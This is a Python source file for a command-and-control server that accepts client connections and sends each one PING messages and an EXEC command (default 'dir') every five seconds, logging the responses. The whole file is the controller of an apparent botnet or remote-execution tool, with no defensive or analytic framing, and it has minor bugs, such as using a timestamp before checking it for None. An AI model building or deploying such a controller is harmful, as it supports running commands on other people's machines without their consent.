import socket
import select
import time
from datetime import datetime
from communication import decode_header, decode_message, encode_message, format_timestamp, MESSAGES, HEADER_SIZE


class CNCServer:
    def __init__(self, host='0.0.0.0', port=65432):
        self.host = host
        self.port = port
        self.server_socket = None
        self.inputs = []
        self.outputs = []
        self.clients_commands_times = {}
        self.message_queues = {}
        self.commands = {
            MESSAGES.get('PING'): [],
            MESSAGES.get('EXEC'): ['dir']
        }

    def start_server(self):
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as self.server_socket:
            self.server_socket.bind((self.host, self.port))
            self.server_socket.listen()
            self.server_socket.setblocking(False)
            print(f"Server listening on {self.host}:{self.port}")

            self.inputs = [self.server_socket]

            while True:
                readable, writeable, exceptional = select.select(self.inputs, self.outputs, self.inputs + self.outputs)
                self.handle_sockets(readable, writeable, exceptional)

    def handle_sockets(self, readable, writeable, exceptional):
        for current_socket in readable:
            if current_socket is self.server_socket:
                self.accept_new_connection()
            else:
                self.handle_recv_message(current_socket)

        for current_socket in writeable:
            self.handle_send_message(current_socket)

        for current_socket in exceptional:
            self.cleanup_socket(current_socket)

        self.run_commands()

    def accept_new_connection(self):
        print('[+] Received new connection')
        connection, client_address = self.server_socket.accept()
        connection.setblocking(False)
        self.inputs.append(connection)
        self.outputs.append(connection)

        self.message_queues[connection] = [MESSAGES.get('PING')]
        self.clients_commands_times[connection] = {MESSAGES.get('PING'): time.time()}

    def handle_recv_message(self, current_socket):
        result = self.recv_message(current_socket)
        if not result:
            self.cleanup_socket(current_socket)

    @staticmethod
    def recv_message(current_socket):
        try:
            encoded_header = current_socket.recv(HEADER_SIZE)
            if not encoded_header:
                print("Client closed connection")
                return False

            message_length = decode_header(encoded_header)

            if message_length == -1:
                return False

            sent_timestamp, message, parameters = decode_message(current_socket.recv(message_length))

            now = format_timestamp(datetime.now())
            delta_ms = (now - sent_timestamp).total_seconds() * 1000

            if sent_timestamp is None:
                print(f'[RECEIVED] {datetime.now()} - {current_socket.fileno()} - BAD MESSAGE')
                return False

            print(f'[RECEIVED] {datetime.now()} - {current_socket.fileno()} - {message} - took {delta_ms}ms')
            return True
        except ConnectionResetError:
            print(f'[RECEIVED] {current_socket.fileno()} - disconnected forcibly')
            return False

    def handle_send_message(self, current_socket):
        try:
            if current_socket not in self.message_queues:
                return

            for current_msg in self.message_queues[current_socket]:
                parameters = self.commands[current_msg]
                current_time = datetime.now()

                print(f'[SENDING] {current_time} - {current_socket.fileno()} - {current_msg} - {parameters}')

                current_socket.sendall(encode_message(current_msg, parameters))
                self.message_queues[current_socket].remove(current_msg)
        except Exception as e:
            print(f'[ERROR] {current_socket.fileno()} - Could not send message to client - {e}')

    def cleanup_socket(self, current_socket):
        print(f'Cleaning up socket - {current_socket.fileno()}')

        if current_socket in self.inputs:
            self.inputs.remove(current_socket)
        if current_socket in self.outputs:
            self.outputs.remove(current_socket)
        if current_socket in self.message_queues:
            del self.message_queues[current_socket]

        current_socket.close()

    def run_commands(self):
        current_time = time.time()

        for current_socket in self.inputs:
            for command_name in self.commands.keys():
                if current_socket is self.server_socket:
                    continue

                if current_time - self.clients_commands_times.get(current_socket).get(command_name, 0) >= 5:
                    self.message_queues[current_socket].append(command_name)

                    if not self.clients_commands_times[current_socket]:
                        self.clients_commands_times[current_socket] = {}

                    self.clients_commands_times[current_socket][command_name] = current_time
